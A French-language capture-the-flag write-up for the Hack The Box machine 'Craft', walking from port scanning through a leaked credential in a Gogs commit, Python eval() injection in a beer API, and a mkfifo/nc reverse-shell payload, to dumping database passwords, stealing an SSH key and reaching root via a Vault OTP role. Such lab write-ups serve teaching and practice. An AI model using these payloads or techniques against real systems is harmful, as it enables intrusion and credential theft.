# 10.10.10.110

# Reco

`ping 10.10.10.110`

```
64 bytes from 10.10.10.110: icmp_seq=1 ttl=63 time=105 ms
64 bytes from 10.10.10.110: icmp_seq=2 ttl=63 time=21.3 ms
```

`sudo nmap -Pn -sS -vvv -p- -oA 10.10.10.110_sS 10.10.10.110`

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
443/tcp  open  https   syn-ack ttl 62
6022/tcp open  x11     syn-ack ttl 62
```

`sudo nmap -Pn -sV -vvv -p22,443,6022 -oA 10.10.10.110_sV 10.10.10.110`

```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
443/tcp  open  ssl/http syn-ack ttl 62 nginx 1.15.8
6022/tcp open  ssh      syn-ack ttl 62 (protocol 2.0)
```

# Ports
## HTTPS (443/TCP)

https://10.10.10.110/

- Le boutton API renvoie vers : https://api.craft.htb/api/
- Un autre bouton renvoie vers : https://gogs.craft.htb/
- On ajoute donc craft.htb & ses 2 sous domaine a notre fichier /etc/hosts

```
/etc/hosts : 10.10.10.110	craft.htb api.craft.htb gogs.craft.htb
```

### Sous domaine gogs

- Alternative de github en GO
    - Gogs Version: 0.11.86.0130
	- Go1.11.5

- Accés à la repo (code source) de l'API exposé sur l'autre sous domaine : https://gogs.craft.htb/Craft/craft-api

- Une issue est ouverte, on y trouve : 
```	
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```

- Mais ce JWT est inutilisable
- Quatre utilisateurs sont associés à la repo : 
    - administrator
    - ebachman
    - dinesh
    - gilfoyle

Lecture du contenus du JWT

```json
Headers = {
  "alg" : "HS256",
  "typ" : "JWT"
}
Payload = {
  "user" : "user",
  "exp" : 1549385242
}
Signature = "-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw"
```

- En regardant les modifications faites à chaque commit on trouve : https://gogs.craft.htb/Craft/craft-api/commit/10e3ba4f0a09c778d7cec673f28d410b73455a86
tests/test.py

```
+response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
```

- Ne fonctionne avec aucun utilisateur via SSH
- Fonctionne sur Gogs
- Fonctionne sur l'API

On peut s'authentificer sur https://api.craft.htb/api/auth/login via `dinesh/4aUh0A8PbVJxgd` et obtenir un JWT valide

```{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxMjI2MTMxfQ.ceJaPHlD-dQuKehzdU3kFw2uzQs2GdozUGTEgJ3RheA"}
```

```
GET /api/auth/check HTTP/1.1
Host: api.craft.htb
X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxMjI2MTMxfQ.ceJaPHlD-dQuKehzdU3kFw2uzQs2GdozUGTEgJ3RheA
Content-Length: 4

HTTP/1.1 200 OK
Server: nginx/1.15.8
{"message":"Token is valid!"}
```

- Sur un second commit `c414b16057` on identifie une fonction `eval()` prenant des données utilisateurs non parsé en paramétre : 

```python
      # make sure the ABV value is sane.
+        if eval('%s > 1' % request.json['abv']):
+            return "ABV must be a decimal value less than 1.0", 400
+        else:
+            create_brew(request.json)
+            return None, 201
```

- On a une injection une commande permettant de ping notre machine

```
POST /api/brew/ HTTP/1.1
Host: api.craft.htb
X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxMjQwMzA4fQ.giWh0XMoBiYQbIW7GgSBbGLEefBqkQeh2eVU1tXNB6E
Content-Length: 127
{
  "brewer": "test",
  "name": "test",
  "style": "test",
  "abv": "__import__('os').popen('ping -c 6 10.10.14.194').read()"
}
```

- On reçoit bien les ping

```
sudo tcpdump -s0 -n -i tun0 src 10.10.10.110
17:34:50.871352 IP 10.10.10.110 > 10.10.14.194: ICMP echo request, id 25627, seq 0, length 64
17:34:51.910586 IP 10.10.10.110 > 10.10.14.194: ICMP echo request, id 25627, seq 1, length 64
```

- On réussis à l'exploiter en reprenant le script https://gogs.craft.htb/Craft/craft-api/raw/master/tests/test.py

```python
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew 
print("Create real ABV brew")
brew_dict = {}
brew_dict['abv'] = "__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.229 7070 >/tmp/f').read()"
brew_dict['name'] = "bullshit"
brew_dict['brewer'] = "bullshit"
brew_dict['style'] = "bullshit"

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```

#### Jail

- On est dans un container :

`/opt/app # hostname`

```
5a3d243127f5
```

`/opt/app # id`

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

`/opt/app # help`
```
Built-in commands:
------------------
	. : [ [[ alias bg break cd chdir command continue echo eval exec
	exit export false fg getopts hash help history jobs kill let
	local printf pwd read readonly return set shift source test times
	trap true type ulimit umask unalias unset wait
```

- On découvre un fichier contenant les identifiants de connexion à la BDD

`/opt/app/craft_api # cat settings.py`

```
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'

# Flask-Restplus settings
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
``` 

- On identifie un script permettant la connexion à la BDD : 

`/opt/app # ls -la`

```
total 44
[...]
-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
``` 

`/opt/app # cat dbtest.py`

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
```

- On mixe les deux fichiers pour obtenir un script prenant la commande SQL en paramètre : 

```python
#!/usr/bin/env python
import pymysql
import sys
connection = pymysql.connect(host='db',user='craft',password='qLGockJ6G2J75O',db='craft',cursorclass=pymysql.cursors.DictCursor)
try:
    with connection.cursor() as cursor:
        sql = sys.argv[1]
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)
finally:
    connection.close()
```

- On affiche les BDD disponibles `python co.py "show databases"`

```json
{'Database': 'craft'}
{'Database': 'information_schema'}
```

- Puis les tables : `/tmp # python co.py "show tables" `

```json
{'Tables_in_craft': 'brew'}
{'Tables_in_craft': 'user'}
```

- On récupére le contenus de la table user : `/tmp # python co.py "select * from user"`

```json
{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
```

- Les identifiants `gilfoyle\ZEU3N8WNM2rh4T` fonctionne sur Gogs

- Sur le profil de gilfoyle il y a une repository privée, avec un dossier `.ssh` - https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/ - contenant clé privé et clé publique

- On télécharge en local le fichier `id_rsa`
- On s'authentifie `ssh -i ~/id_rsa_craft_gilfoyle gilfoyle@10.10.10.110` en utilisant `ZEU3N8WNM2rh4T` comme Passphrase

##### SSH as gilfoyle

- On identifie un fichier `.vault-token`

`gilfoyle@craft:~$ ls -la`

```
total 36
[...]
-r-------- 1 gilfoyle gilfoyle   33 Feb  9 22:46 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Feb  9 00:26 .vault-token
```

`gilfoyle@craft:~$ cat .vault-token`

```
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

- Cf Vault Project : https://www.vaultproject.io/

- Ainsi qu'un fichier `secrets.sh` sur Gogs : https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh

```
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

- Cf Vault Command Line Documentation  : https://www.vaultproject.io/docs/commands/index.html


`gilfoyle@craft:~$ vault secrets list`

```
Path          Type         Accessor              Description
----          ----         --------              -----------
cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage
identity/     identity     identity_56533c34     identity store
secret/       kv           kv_2d9b0109           key/value secret storage
ssh/          ssh          ssh_3bbd5276          n/a
sys/          system       system_477ec595       system endpoints used for control, policy and debugging
```

- On réutilise l'information contenus dans `secrets.sh` : `gilfoyle@craft:~$ vault read ssh/roles/root_otp`

``` 
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
``` 

- On utilise la commande SSH pour se connecter : `gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1`
- Cf https://www.vaultproject.io/docs/commands/ssh.html

```
Vault could not locate "sshpass". The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: bd254a4f-a8b9-1ec8-ae01-388c2bbe0c5f

Password : 
Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# Proof

- User : bbf4b0cadfa3XXXXXXXXXX9cd5a612d4
- Root : 831d64ef54d9XXXXXXXXXXae28a11591